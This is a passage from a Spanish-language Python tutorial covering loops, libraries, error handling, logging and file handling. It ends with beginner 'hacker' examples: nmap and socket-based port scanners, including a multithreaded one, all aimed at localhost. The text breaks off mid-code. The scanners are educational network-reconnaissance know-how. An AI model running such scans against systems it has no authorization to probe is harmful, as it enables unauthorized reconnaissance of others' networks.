# Forma compacta (operador ternario)
mensaje = "Mayor de edad" if edad >= 18 else "Menor de edad"
print(mensaje)  # Mayor de edad

# Con None
nombre = None
nombre_mostrar = nombre or "Anónimo"
print(nombre_mostrar)  # Anónimo

nombre = "Juan"
nombre_mostrar = nombre or "Anónimo"
print(nombre_mostrar)  # Juan
```

**Ejemplo práctico: Sistema de descuentos**
```python
precio = 100
es_estudiante = True
tiene_cupon = False

# Calcular descuento
descuento = 0
if es_estudiante and tiene_cupon:
    descuento = 30
elif es_estudiante:
    descuento = 15
elif tiene_cupon:
    descuento = 10

precio_final = precio - (precio * descuento / 100)
print(f"Precio original: ${precio}")
print(f"Descuento: {descuento}%")
print(f"Precio final: ${precio_final}")
# Precio original: $100
# Descuento: 15%
# Precio final: $85.0
```

### Bucle While

El bucle while se utiliza para repetir un bloque de código mientras se cumpla una condición. Es ideal cuando no se sabe de antemano cuántas veces debe repetirse una acción, pero sí se conoce la condición que debe mantenerse verdadera. El programa evaluará la condición antes de cada repetición, y saldrá del bucle en cuanto la condición sea falsa. Es importante asegurarse de que la condición cambie en algún momento, para evitar bucles infinitos.
#### Bucle while

Ejemplo básico: Contar del 1 al 5
```python
# Inicializar contador
i = 1

# Bucle while
while i <= 5:
    print(f"Número: {i}")
    i += 1  # Incrementar (equivale a i = i + 1)

# Salida:
# Número: 1
# Número: 2
# Número: 3
# Número: 4
# Número: 5
```

Ejemplo: While con rango
```python
# Inicializamos la variable de control
i = 1

# Bucle while que se ejecuta mientras i esté dentro del rango de 1 a 5
i = 0
while i in range(5):
    print(i)
    i += 1
# Salida: 0, 1, 2, 3, 4
```

Ejemplo: Suma acumulativa
```python
suma = 0
numero = 1

while numero <= 5:
    suma += numero  # suma = suma + numero
    print(f"Sumando {numero}, total: {suma}")
    numero += 1

print(f"Suma final: {suma}")
# Sumando 1, total: 1
# Sumando 2, total: 3
# Sumando 3, total: 6
# Sumando 4, total: 10
# Sumando 5, total: 15
# Suma final: 15
```

#### Break (salir del bucle)

Ejemplo: Uso de break
```python
for i in range(1, 11):
    if i == 5:
        break  # Sale del bucle cuando i es 5
    print(i)

# Salida: 1, 2, 3, 4
# No imprime 5 ni los números siguientes
```

Ejemplo práctico: Buscar un número
```python
numeros = [10, 25, 30, 15, 40, 50]
buscar = 15

for num in numeros:
    if num == buscar:
        print(f"¡Número {buscar} encontrado!")
        break
else:
    print(f"Número {buscar} no encontrado")
# ¡Número 15 encontrado!
```

#### Continue (saltar a la siguiente iteración)

Ejemplo: Uso de continue
```python
for i in range(1, 11):
    if i == 5:
        continue  # Salta a la siguiente iteración cuando i es 5
    print(i)

# Salida: 1, 2, 3, 4, 6, 7, 8, 9, 10
# No imprime el 5
```

Ejemplo: Imprimir solo números pares
```python
for i in range(1, 11):
    if i % 2 != 0:  # Si es impar
        continue    # Saltar
    print(i)

# Salida: 2, 4, 6, 8, 10
```

#### Bucle infinito

Ejemplo: Menú interactivo
```python
while True:
    print("\n=== MENÚ ===")
    print("1. Saludar")
    print("2. Despedirse")
    print("3. Salir")
    
    opcion = input("Elige una opción: ")
    
    if opcion == "1":
        print("¡Hola! ¿Cómo estás?")
    elif opcion == "2":
        print("¡Hasta luego!")
    elif opcion == "3":
        print("Saliendo del programa...")
        break  # Sale del bucle infinito
    else:
        print("Opción no válida")

print("Programa terminado")
```

Ejemplo de bucle infinito con entrada esperada:
```python
while True:
    linea = input('> ')
    if linea == 'fin':
        break
    print(linea)
print('¡Terminado!')
```


### Bucle For

El bucle for se usa para recorrer elementos de una secuencia, como listas, cadenas de texto o rangos de números. Es muy útil cuando se quiere repetir una acción un número determinado de veces o procesar cada elemento de una colección. A diferencia del while, el for trabaja directamente sobre una secuencia y no necesita una condición explícita, lo que lo hace más fácil de controlar y leer en muchas situaciones comunes.

Ejemplo básico: Bucle con range

```python
# Bucle for que recorre el rango de 1 a 10
for i in range(1, 11):
    print(i)

# Salida: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10
```

Ejemplo: Diferentes usos de range

```python
# range(stop) - desde 0 hasta stop-1
for i in range(5):
    print(i)  # 0, 1, 2, 3, 4

# range(start, stop) - desde start hasta stop-1
for i in range(2, 6):
    print(i)  # 2, 3, 4, 5

# range(start, stop, step) - con incremento personalizado
for i in range(0, 11, 2):
    print(i)  # 0, 2, 4, 6, 8, 10

# Rango descendente
for i in range(10, 0, -1):
    print(i)  # 10, 9, 8, 7, 6, 5, 4, 3, 2, 1
```


Ejemplo: Iterar sobre una cadena
```python
palabra = 'banana'
contador = 0

for letra in palabra:
    if letra == 'a':
        contador = contador + 1

print(f"La letra 'a' aparece {contador} veces")
# La letra 'a' aparece 3 veces
```

Ejemplo: Iterar sobre una lista
```python
frutas = ["manzana", "banana", "cereza", "durazno"]

for fruta in frutas:
    print(f"Me gusta la {fruta}")

# Salida:
# Me gusta la manzana
# Me gusta la banana
# Me gusta la cereza
# Me gusta la durazno
```

Ejemplo: Iterar con índice (enumerate)
```python
colores = ["rojo", "verde", "azul"]

for indice, color in enumerate(colores):
    print(f"{indice}: {color}")

# Salida:
# 0: rojo
# 1: verde
# 2: azul

# Empezar desde 1
for indice, color in enumerate(colores, 1):
    print(f"{indice}. {color}")

# Salida:
# 1. rojo
# 2. verde
# 3. azul
```

Ejemplo: Iterar sobre diccionario
```python
estudiante = {
    "nombre": "Ana",
    "edad": 20,
    "carrera": "Ingeniería"
}

# Iterar sobre claves
for clave in estudiante:
    print(f"{clave}: {estudiante[clave]}")

# Iterar sobre clave y valor
for clave, valor in estudiante.items():
    print(f"{clave}: {valor}")

# Salida:
# nombre: Ana
# edad: 20
# carrera: Ingeniería
```

Ejemplo práctico: Tabla de multiplicar
```python
numero = 5
print(f"Tabla de multiplicar del {numero}:")

for i in range(1, 11):
    resultado = numero * i
    print(f"{numero} x {i} = {resultado}")

# Salida:
# Tabla de multiplicar del 5:
# 5 x 1 = 5
# 5 x 2 = 10
# 5 x 3 = 15
# ... hasta 50
```


## Instalar, importar y usar librerías

Las librerías (o módulos) son conjuntos de funciones predefinidas que extienden las capacidades de Python hasta el infinito, ayudándonos a no tener que inventar la rueda, cuando en la mayoría de los casos ya está inventada y perfeccionada al máximo.

### From pytools

Esta es la herramienta de gestor de librerías de Python más usada y más sencilla. En su gran repositorio ofrece miles de librerías a tu disposición en todas sus versiones.

```bash
# Instalar una librería específica
pip3 install scapy

# Instalar múltiples librerías
pip3 install requests beautifulsoup4 selenium

# Instalar desde un archivo de requisitos
pip3 install -r requirements.txt

# Actualizar una librería
pip3 install --upgrade requests

# Ver librerías instaladas
pip3 list
```

Archivo requirements.txt de ejemplo:
```text
requests==2.28.0
beautifulsoup4==4.11.1
scapy==2.5.0
flask==2.2.2
```

### From debian packages

Instalar paquetes desde el sistema Linux tiene ventajas e inconvenientes. La ventaja de ser la forma más fácil de hacerlo, se convierte en un problema en ocasiones, cuando intentamos actualizar algunos paquetes desde el gestor de paquetes de Python.

```bash
# En Debian/Ubuntu
apt install python3-pip
apt install python3-requests
apt install python3-flask
```

### Importar librerías en script

```python
# Importar módulo completo
import os
import sys
import json

# Usar funciones del módulo
directorio_actual = os.getcwd()
print(directorio_actual)

# Importar múltiples módulos en una línea
import os, sys, json

# Importar función específica
from datetime import datetime
now = datetime.now()
print(now)

# Importar todo de un módulo (no recomendado)
from math import *
print(sqrt(16))  # 4.0
```

Ejemplo: Trabajar con módulos estándar de Python
```python
# os - Sistema operativo
import os
print(os.getcwd())  # Directorio actual
print(os.listdir('.'))  # Listar archivos

# sys - Sistema Python
import sys
print(sys.version)  # Versión de Python
print(sys.argv)  # Argumentos de línea de comandos

# datetime - Fecha y hora
from datetime import datetime
ahora = datetime.now()
print(f"Fecha y hora: {ahora}")
print(f"Solo fecha: {ahora.date()}")
print(f"Solo hora: {ahora.time()}")
```

Ejemplo: Librería requests (HTTP)
```python
import requests

# Hacer una petición GET
respuesta = requests.get('https://api.github.com')
print(f"Código de estado: {respuesta.status_code}")
print(f"Contenido: {respuesta.json()}")

# Hacer una petición POST
datos = {'username': 'usuario', 'password': 'clave'}
respuesta = requests.post('https://ejemplo.com/login', json=datos)
```

Ejemplo: Librería json
```python
import json

# Diccionario a JSON string
persona = {"nombre": "Juan", "edad": 30}
json_string = json.dumps(persona)
print(json_string)  # {"nombre": "Juan", "edad": 30}

# JSON string a diccionario
datos = '{"producto": "laptop", "precio": 999}'
producto = json.loads(datos)
print(producto["producto"])  # laptop

# Guardar JSON en archivo
with open('datos.json', 'w') as archivo:
    json.dump(persona, archivo, indent=2)

# Leer JSON desde archivo
with open('datos.json', 'r') as archivo:
    datos = json.load(archivo)
    print(datos)
```

Ejemplo: Current datetime y timestamp
```python
from datetime import datetime

# Fecha y hora actual
now = datetime.now()
print(f"Ahora: {now}")

# Convertir a Unix timestamp
timestamp = int(now.timestamp())
print(f"Timestamp: {timestamp}")  # Output: Unix timestamp en segundos

# Convertir timestamp a datetime
fecha_desde_timestamp = datetime.fromtimestamp(timestamp)
print(f"Fecha desde timestamp: {fecha_desde_timestamp}")

# Formatear fecha
fecha_formateada = now.strftime("%Y-%m-%d %H:%M:%S")
print(f"Formateada: {fecha_formateada}")  # 2024-01-15 14:30:45
```

Ejemplo: Crear alias para módulos
```python
# Usar alias para nombres largos
import datetime as dt
import numpy as np  # Convención común
import pandas as pd  # Convención común

ahora = dt.datetime.now()
print(ahora)
```

Ejemplo práctico: Script completo con múltiples librerías
```python
#!/usr/bin/env python3
"""
Script de ejemplo que usa múltiples librerías
"""
import os
import sys
import json
from datetime import datetime

def main():
    # Información del sistema
    print("=== Información del Sistema ===")
    print(f"Python version: {sys.version}")
    print(f"Directorio actual: {os.getcwd()}")
    
    # Fecha y hora
    print("\n=== Fecha y Hora ===")
    ahora = datetime.now()
    print(f"Fecha actual: {ahora.strftime('%Y-%m-%d')}")
    print(f"Hora actual: {ahora.strftime('%H:%M:%S')}")
    
    # Trabajar con JSON
    print("\n=== Trabajando con JSON ===")
    datos = {
        "nombre": "Script de ejemplo",
        "version": "1.0",
        "fecha": ahora.isoformat()
    }
    print(json.dumps(datos, indent=2))

if __name__ == "__main__":
    main()
```



## Debugging

El debugging es el proceso de encontrar y corregir errores en el código. Siempre debes preparar tu programa pensando que puedan surgir errores de todo tipo y poniendo medidas para controlar y notificar los errores.

### Try, Except

En Python, try y except se usan para manejar errores de forma controlada, evitando que el programa se detenga bruscamente cuando ocurre un problema. El bloque try contiene el código que puede causar un error, y si ocurre una excepción (como dividir entre cero o abrir un archivo que no existe), Python salta al bloque except, donde puedes capturar el error y responder adecuadamente, como mostrar un mensaje o intentar otra acción. Es una herramienta fundamental para hacer que tus programas sean más robustos y seguros frente a situaciones inesperadas.

```python
# Sin manejo de errores (esto causaría un error)
# numero = int("texto")  # ValueError

# Con manejo de errores
try:
    numero = int("texto")
    print(numero)
except Exception as e:
    print(f"Error: {e}")
# Error: invalid literal for int() with base 10: 'texto'
```

Ejemplo: Errores específicos
```python
try:
    # Intentar dividir por cero
    resultado = 10 / 0
except ZeroDivisionError:
    print("Error: No se puede dividir por cero")
except Exception as e:
    print(f"Otro error: {e}")
```

Ejemplo: Try-except-else-finally
```python
def dividir(a, b):
    try:
        resultado = a / b
    except ZeroDivisionError:
        print("Error: División por cero")
        return None
    except TypeError:
        print("Error: Tipo de dato incorrecto")
        return None
    else:
        # Se ejecuta si NO hay error
        print("División exitosa")
        return resultado
    finally:
        # Se ejecuta SIEMPRE
        print("Fin de la operación")

# Pruebas
print(dividir(10, 2))
# División exitosa
# Fin de la operación
# 5.0

print(dividir(10, 0))
# Error: División por cero
# Fin de la operación
# None
```

Ejemplo práctico: Lectura segura de archivos
```python
def leer_archivo(nombre_archivo):
    try:
        with open(nombre_archivo, 'r') as archivo:
            contenido = archivo.read()
            return contenido
    except FileNotFoundError:
        print(f"Error: El archivo '{nombre_archivo}' no existe")
        return None
    except PermissionError:
        print(f"Error: No tienes permisos para leer '{nombre_archivo}'")
        return None
    except Exception as e:
        print(f"Error inesperado: {e}")
        return None

# Uso
contenido = leer_archivo("datos.txt")
if contenido:
    print(contenido)
```

Ejemplo: Múltiples excepciones
```python
try:
    edad = int(input("Ingresa tu edad: "))
    if edad < 0:
        raise ValueError("La edad no puede ser negativa")
    print(f"Tienes {edad} años")
except ValueError as e:
    print(f"Error de valor: {e}")
except KeyboardInterrupt:
    print("\nPrograma interrumpido por el usuario")
```

---

### Syslog

Usar syslog en aplicaciones en producción es una excelente práctica porque permite centralizar, registrar y monitorear todo tipo de eventos importantes como errores, advertencias, accesos, y cambios en el sistema o la aplicación. Al enviar los mensajes de log al sistema syslog (o a un servidor remoto), se facilita el seguimiento del comportamiento de la aplicación en tiempo real, la detección de fallos, y el cumplimiento de auditorías o normativas. Además, syslog permite clasificar y filtrar los mensajes por niveles de severidad, lo que ayuda a los equipos de desarrollo y operaciones a actuar rápidamente ante incidentes críticos.

```python
import syslog

def log_event(message):
    syslog.openlog("MyApp")  # Opcional: establecer el nombre de la app
    syslog.syslog(syslog.LOG_INFO, message)

# Registrar diferentes tipos de mensajes
log_event("This is an informational event")
syslog.syslog(syslog.LOG_WARNING, "This is a warning")
syslog.syslog(syslog.LOG_ERR, "This is an error")
```

Ejemplo: Sistema de logging completo
```python
import logging

# Configurar logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('app.log'),
        logging.StreamHandler()  # También mostrar en consola
    ]
)

# Crear logger
logger = logging.getLogger('MiApp')

# Usar diferentes niveles
logger.debug('Mensaje de depuración')
logger.info('Mensaje informativo')
logger.warning('Mensaje de advertencia')
logger.error('Mensaje de error')
logger.critical('Mensaje crítico')

# Ejemplo en función
def procesar_datos(datos):
    logger.info(f"Procesando {len(datos)} elementos")
    try:
        # Procesar datos
        resultado = sum(datos)
        logger.info(f"Resultado: {resultado}")
        return resultado
    except Exception as e:
        logger.error(f"Error al procesar datos: {e}")
        return None

# Uso
datos = [1, 2, 3, 4, 5]
procesar_datos(datos)
```

Ejemplo práctico: Script con debugging completo
```python
#!/usr/bin/env python3
import logging
import sys

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def calcular_promedio(numeros):
    """Calcula el promedio de una lista de números"""
    try:
        if not numeros:
            raise ValueError("La lista está vacía")
        
        logger.debug(f"Calculando promedio de: {numeros}")
        promedio = sum(numeros) / len(numeros)
        logger.info(f"Promedio calculado: {promedio}")
        return promedio
        
    except TypeError:
        logger.error("Error: Se esperaba una lista de números")
        return None
    except ZeroDivisionError:
        logger.error("Error: División por cero")
        return None
    except Exception as e:
        logger.error(f"Error inesperado: {e}")
        return None

def main():
    logger.info("Iniciando aplicación")
    
    # Prueba 1: Normal
    resultado = calcular_promedio([10, 20, 30, 40])
    print(f"Resultado: {resultado}")
    
    # Prueba 2: Lista vacía
    resultado = calcular_promedio([])
    print(f"Resultado: {resultado}")
    
    logger.info("Aplicación finalizada")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.warning("Programa interrumpido por el usuario")
        sys.exit(0)
    except Exception as e:
        logger.critical(f"Error fatal: {e}")
        sys.exit(1)
```


## Uso de Argumentos

Aprender a manejar argumentos en Python es esencial para escribir scripts que acepten valores desde la línea de comandos.  

Ejemplo básico de uso de argumentos mediante libreria sys: `argv_usage.py`
```python
import sys

print("Número de argumentos:", len(sys.argv))
print("Lista de argumentos:", sys.argv)

# python3 argv_usage.py uno dos tres
# Número de argumentos: 4
# Lista de argumentos: ['argv_usage.py', 'uno', 'dos', 'tres']
```

Ejemplo usando libreria argparse: `argparse_usage.py`
```python
import argparse

parser = argparse.ArgumentParser(description="Ejemplo básico de argparse.")
parser.add_argument("--nombre", required=True, help="Tu nombre")
parser.add_argument("--edad", type=int, help="Tu edad")

args = parser.parse_args()
print(f"Hola {args.nombre}, tienes {args.edad} años.")

# python3 argparse_usage.py --nombre Ana --edad 30
# Salida:
# Hola Ana, tienes 30 años.
```


## Manejo de archivos

Python permite trabajar fácilmente con archivos para leer, escribir y modificar datos.

### Lectura, escritura, append

Al abrir un archivo, se debe especificar si se desea abrir para solo-lectura (sin alterar el contenido), para escritura (se desea alterar su contenido) o en modo append (solo para añadir datos al final del archivo). Es muy importante definir el tipo de operación y cerrar el archivo al terminar de usarlo.

**Modos de apertura:**
- `'r'`: Lectura (por defecto)
- `'w'`: Escritura (sobrescribe)
- `'a'`: Append (añadir al final)
- `'r+'`: Lectura y escritura
- `'b'`: Modo binario (ej: `'rb'`, `'wb'`)


Ejemplo: Escribir en un archivo
```python
# Crear y escribir en un archivo (modo 'w' - write)
archivo = open("ejemplo.txt", "w")
archivo.write("Hola Mundo\n")
archivo.write("Esta es la segunda línea\n")
archivo.close()
print("Archivo creado y escrito")
```

Ejemplo: Leer un archivo
```python
# Leer todo el contenido (modo 'r' - read)
archivo = open("ejemplo.txt", "r")
contenido = archivo.read()
print(contenido)
archivo.close()
```

Ejemplo: Añadir contenido (append)
```python
try:
    # Abrir archivo en modo append (modo 'a')
    file = open("example.txt", "a")
    # Añadir nueva línea
    file.write("This is a new line added to the file.\n")
    # Cerrar archivo
    file.close()
    print("Contenido añadido exitosamente")
except IOError as error:
    print("I/O error occurred: ", str(error.errno))
```

Ejemplo: Leer línea por línea
```python
# Método 1: readline()
archivo = open("ejemplo.txt", "r")
linea1 = archivo.readline()
linea2 = archivo.readline()
print(linea1)
print(linea2)
archivo.close()

# Método 2: readlines() - retorna lista
archivo = open("ejemplo.txt", "r")
lineas = archivo.readlines()
for linea in lineas:
    print(linea.strip())  # strip() elimina \n
archivo.close()
```


### Métodos de archivo

- `file.open(name_file, mode)`: Abre un archivo con un modo específico
- `file.write(string)`: Escribe una cadena en un archivo
- `file.read([bufsize])`: Lee hasta bufsize bytes del archivo
- `file.readline([bufsize])`: Lee una línea del archivo
- `file.close()`: Cierra el archivo y destruye el objeto

---

### Usando with (recomendado)

El uso de `with` es la forma recomendada porque cierra automáticamente el archivo.

Ejemplo: with para escribir
```python
# Abre el archivo en modo append
with open("eejemploample.txt", "a") as file:
    # Añade una linea al final del archivo
    file.write("Nueva linea al final del archivo.\n")
# El archivo se cierra automáticamente
```

Ejemplo: with para leer
```python
# Leer archivo completo
with open("ejemplo.txt", "r") as archivo:
    contenido = archivo.read()
    print(contenido)
```

Ejemplo: Copiar un archivo
```python
# Copiar contenido de un archivo a otro
with open("original.txt", "r") as origen:
    with open("copia.txt", "w") as destino:
        for linea in origen:
            destino.write(linea)
print("Archivo copiado exitosamente")
```


### Recorriendo líneas

Ejemplo: Procesar archivo línea por línea
```python
# Contar líneas
contador = 0
with open("datos.txt", "r") as manejador:
    for linea in manejador:
        contador += 1
        print(f"Línea {contador}: {linea.rstrip()}")

print(f"Total de líneas: {contador}")
```

Ejemplo: Buscar en un archivo
```python
# Buscar líneas que contengan una palabra
palabra_buscar = "Python"

with open("documento.txt", "r") as archivo:
    for numero_linea, linea in enumerate(archivo, 1):
        if palabra_buscar in linea:
            print(f"Línea {numero_linea}: {linea.strip()}")
```

Ejemplo práctico: Procesar archivo CSV manualmente
```python
# Leer y procesar archivo CSV
with open("estudiantes.csv", "r") as archivo:
    # Leer encabezado
    encabezado = archivo.readline().strip().split(",")
    print(f"Columnas: {encabezado}")
    
    # Procesar datos
    for linea in archivo:
        datos = linea.strip().split(",")
        nombre, edad, nota = datos
        print(f"{nombre}: {nota} puntos")
```

Ejemplo: Contar palabras en un archivo
```python
def contar_palabras(nombre_archivo):
    try:
        with open(nombre_archivo, "r") as archivo:
            contenido = archivo.read()
            palabras = contenido.split()
            return len(palabras)
    except FileNotFoundError:
        print(f"Error: Archivo '{nombre_archivo}' no encontrado")
        return 0

# Uso
total = contar_palabras("documento.txt")
print(f"Total de palabras: {total}")
```


## Acerca del uso de la IA

Es importante entender que la inteligencia artificial (IA) y las herramientas modernas como Cursor (un editor de código con IA integrada) no están aquí para reemplazar el aprendizaje, sino para potenciarlo. Estas herramientas pueden ayudarte a escribir código más rápido, corregir errores, entender fragmentos complicados y explorar nuevas ideas. Por ejemplo, si no sabes cómo usar una función o librería, puedes pedirle a la IA una explicación o un ejemplo práctico, y eso te ahorra tiempo de búsqueda en internet. Además, ver cómo la IA sugiere soluciones puede enseñarte nuevas formas de pensar el código.

Sin embargo, es fundamental no depender ciegamente de estas herramientas. Aprender programación significa entender el “por qué” y el “cómo” detrás de cada línea de código. Usa la IA como un asistente, no como una muleta. Intenta resolver los problemas por tu cuenta primero, y luego consulta a la IA para comparar soluciones o mejorar tu enfoque. Con esta combinación —tu curiosidad y las capacidades de la IA— puedes avanzar mucho más rápido en tu camino como desarrollador.

- Práctica: Usando cursor para mejorar el código


## Ejemplos prácticos de Python para hackers

En esta sección se presentan algunos ejemplos sencillos de programación en Python para programadores noveles. 

### Uso de estructuras, JSON y archivos

JSON (JavaScript Object Notation) es un formato muy similar a los diccionarios de Python y se usa mucho para intercambiar datos entre aplicaciones o funciones.

#### 1. Ejemplo de manejo de archivos JSON. Guardar diccionario como json `json_from_dict.py`

Este script define un diccionario con información sobre puertos comunes en ciberseguridad (como HTTP, FTP o SSH), imprime sus datos en pantalla y luego guarda todo en un archivo .json llamado cybersecurity_ports.json. Este ejemplo es excelente para aprender cómo estructurar información en Python, cómo recorrerla con bucles, y cómo almacenarla en un formato que se puede compartir y reutilizar fácilmente.

```python
import json  # Módulo para trabajar con archivos JSON

# Diccionario con información sobre puertos y protocolos
datos_ciberseguridad = {
    "puertos": [
        {"nombre": "HTTP", "puerto": 80, "protocolo": "TCP"},
        {"nombre": "HTTPS", "puerto": 443, "protocolo": "TCP"},
        {"nombre": "FTP", "puerto": 21, "protocolo": "TCP"},
        {"nombre": "SSH", "puerto": 22, "protocolo": "TCP"},
        {"nombre": "DNS", "puerto": 53, "protocolo": "UDP"},
        {"nombre": "SMTP", "puerto": 25, "protocolo": "TCP"},
        {"nombre": "POP3", "puerto": 110, "protocolo": "TCP"},
        {"nombre": "IMAP", "puerto": 143, "protocolo": "TCP"},
        {"nombre": "SNMP", "puerto": 161, "protocolo": "UDP"},
    ]
}

# Recorremos los puertos y mostramos su información
for servicio in datos_ciberseguridad["puertos"]:
    print("Nombre:", servicio["nombre"])
    print("Puerto:", servicio["puerto"])
    print("Protocolo:", servicio["protocolo"])
    print("---")

# Guardamos el diccionario como archivo JSON
with open("puertos_ciberseguridad.json", "w") as archivo_json:
    json.dump(datos_ciberseguridad, archivo_json, indent=4)

print("Datos guardados en puertos_ciberseguridad.json")

```


#### 2. Ejemplo de manejo de archivos JSON. Leer archivo json a diccionario `json_file_to_dict.py`

Este script abre un archivo llamado cybersecurity_ports.json (creado por el ejemplo anterior), lo lee y convierte su contenido en un diccionario de Python, lo cual permite acceder y manipular los datos directamente desde el código. Luego, recorre cada entrada del archivo y muestra el nombre del servicio, su número de puerto y el protocolo que usa (TCP o UDP). Es una excelente introducción al manejo de archivos, lectura de datos estructurados y uso de bucles en Python.

```python
import json  # Módulo para trabajar con archivos JSON

# Abrimos el archivo JSON y cargamos su contenido en una variable tipo diccionario
with open("puertos_ciberseguridad.json", "r") as archivo_json:
    datos = json.load(archivo_json)

# Mostramos el contenido completo para ver cómo está estructurado
print("Contenido del archivo:")
print(datos)

print("\nListado de puertos y protocolos:")

# Recorremos la lista de puertos y mostramos sus datos
for servicio in datos["puertos"]:
    print(f"Nombre: {servicio['nombre']}, Puerto: {servicio['puerto']}, Protocolo: {servicio['protocolo']}")
```


#### 3. Ejemplo de guardado de información de nmap en formato json: `nmap_scanner.py`

Este script utiliza la herramienta Nmap (a través de su módulo de Python) para escanear los primeros 1024 puertos de una dirección IP local o remota. Detecta si esos puertos están abiertos, qué servicios están corriendo y guarda toda esa información en un archivo .json. Es una introducción muy útil para quienes quieren aprender sobre redes, puertos, servicios y automatización con Python.

```python
# Requisitos:
# - Tener Nmap instalado en el sistema
# - Instalar el módulo de Python: pip install python-nmap

import nmap  # Librería para controlar Nmap desde Python
import json  # Para guardar resultados como archivo JSON

# Crear el escáner de puertos
scanner = nmap.PortScanner()

# Definir el objetivo y el rango de puertos
objetivo = "127.0.0.1"      # Dirección IP del equipo a escanear (localhost en este caso)
puertos = "1-1024"          # Rango de puertos a revisar

print(f"Escaneando {objetivo} en puertos {puertos}...")
scanner.scan(hosts=objetivo, ports=puertos)  # Ejecuta el escaneo

# Diccionario donde guardaremos los resultados
resultado_escaneo = {}

# Recorremos todos los hosts encontrados (en este caso, solo uno)
for host in scanner.all_hosts():
    resultado_escaneo[host] = {
        "estado": scanner[host].state(),  # online/offline
        "protocolos": {}
    }

    for protocolo in scanner[host].all_protocols():
        resultado_escaneo[host]["protocolos"][protocolo] = {}

        for puerto in scanner[host][protocolo].keys():
            info = scanner[host][protocolo][puerto]
            resultado_escaneo[host]["protocolos"][protocolo][puerto] = {
                "estado": info["state"],
                "nombre": info.get("name"),
                "producto": info.get("product"),
                "version": info.get("version")
            }

# Guardamos los datos en un archivo JSON
archivo_salida = "resultados_escaneo.json"
with open(archivo_salida, "w") as archivo:
    json.dump(resultado_escaneo, archivo, indent=4)

print(f"Resultados guardados en: {archivo_salida}")

```


#### 4. Ejemplo manejo de txt, json and requests: `get_oui.py`

Este programa descarga una lista de identificadores de fabricantes de dispositivos de red (OUI) desde el sitio oficial de IEEE, los convierte a un formato más sencillo (JSON), y los guarda localmente. El OUI forma parte de la dirección MAC y sirve para identificar al fabricante de un dispositivo. Este script es útil para aprender sobre manejo de texto, uso de archivos, procesamiento de datos desde internet, y conversión a formatos como JSON.

```python
# Requiere tener instalada la librería requests: pip install requests

import requests
import json

# URL donde se encuentra el archivo original con los datos OUI
URL_OUI = "http://standards-oui.ieee.org/oui/oui.txt"

# Nombre del archivo de salida en formato JSON
ARCHIVO_SALIDA = "lista_oui.json"

# Función que descarga el archivo desde internet
def descargar_oui(url):
    try:
        respuesta = requests.get(url)
        respuesta.raise_for_status()  # Verifica que la descarga sea exitosa
        return respuesta.text
    except requests.RequestException as error:
        print("Error al descargar el archivo:", error)
        return None

# Función que extrae los datos importantes y los convierte a una lista de diccionarios
def analizar_oui(texto):
    datos = []
    lineas = texto.splitlines()

    for linea in lineas:
        if "(base 16)" in linea:
            partes = linea.split("(base 16)")
            oui = partes[0].strip().replace("-", ":")       # Convierte el OUI a formato XX:XX:XX
            fabricante = partes[1].strip()
            datos.append({"oui": oui, "organizacion": fabricante})

    return datos

# Función para guardar los datos como archivo JSON
def guardar_json(datos, nombre_archivo):
    try:
        with open(nombre_archivo, "w") as archivo:
            json.dump(datos, archivo, indent=4)
        print("Datos guardados en:", nombre_archivo)
    except IOError as error:
        print("Error al guardar el archivo:", error)

# Función principal que controla el flujo del programa
def main():
    contenido = descargar_oui(URL_OUI)
    if contenido is None:
        return  # Si hubo error al descargar, detenemos el programa

    datos_oui = analizar_oui(contenido)
    guardar_json(datos_oui, ARCHIVO_SALIDA)

# Ejecutamos el programa principal
if __name__ == "__main__":
    main()
```


#### 5. Ejemplo de Escáner de puertos TCP básico `socket_scanner.py`

Este programa explora un rango de puertos TCP en un equipo (por defecto, en 127.0.0.1, es decir, tu propio ordenador) y verifica cuáles están abiertos. Utiliza la función connect_ex() de la librería socket para intentar conectarse a cada puerto. Si la conexión tiene éxito, se considera que el puerto está "abierto". Es una forma práctica y segura de introducir conceptos como puertos, servicios y escaneo de red.

```python
import socket  # Módulo para trabajar con conexiones de red

# Dirección IP del equipo a escanear (localhost por defecto)
objetivo = "127.0.0.1"

# Rango de puertos a probar (puedes reducirlo para pruebas rápidas)
puertos = range(1, 1025)  # Del 1 al 1024 (puertos comunes)

# Mostrar puertos cerrados (útil para depurar)
debug = False

# Función que escanea los puertos del objetivo
def escanear_puertos(host, rango_puertos):
    print(f"Escaneando {host}...")

    for puerto in rango_puertos:
        # Creamos un socket tipo TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)  # Máximo 1 segundo por intento

        # Intentamos conectarnos al puerto
        resultado = s.connect_ex((host, puerto))

        if resultado == 0:
            print(f"Puerto {puerto}: ABIERTO")
        elif debug:
            print(f"Puerto {puerto}: CERRADO")

        s.close()  # Cerramos el socket para liberar recursos

# Ejecutamos el escaneo
escanear_puertos(objetivo, puertos)
```

### Uso de Threads y Procesos

#### 1. Ejemplo de Versión usando multihilo: `socket_scanner_multithreaded.py`

Este script explora puertos en un equipo (por ejemplo, 127.0.0.1) e identifica cuáles están abiertos, igual que un escáner clásico. Pero aquí se introduce el concepto de multihilo: el programa lanza múltiples tareas al mismo tiempo (hasta 100 en paralelo), lo que hace que el escaneo sea mucho más rápido que si se hiciera de uno en uno. En Python, esto se logra con ThreadPoolExecutor, que gestiona un grupo de hilos para ejecutar funciones concurrentemente.

```python
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

# Dirección del objetivo (localhost en este caso)
objetivo = "127.0.0.1"

# Rango de puertos a escanear (puedes reducirlo para pruebas)
rango_puertos = range(1, 1025)  # Puertos comunes: 1 al 1024

# Función que intenta conectarse a un puerto
def escanear_puerto(puerto):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(0.5)  # Tiempo máximo de espera
        if sock.connect_ex((objetivo, puerto)) == 0:
            return puerto, "ABIERTO"
        return puerto, "CERRADO"

# Ejecutamos el escaneo en paralelo usando hilos
def escaneo_con_hilos():
    print(f"Escaneando {objetivo} con múltiples hilos...")

    # Creamos un "pool" de 100 hilos
    with ThreadPoolExecutor(max_workers=100) as ejecutor:
        # Enviamos tareas al pool: un hilo por puerto
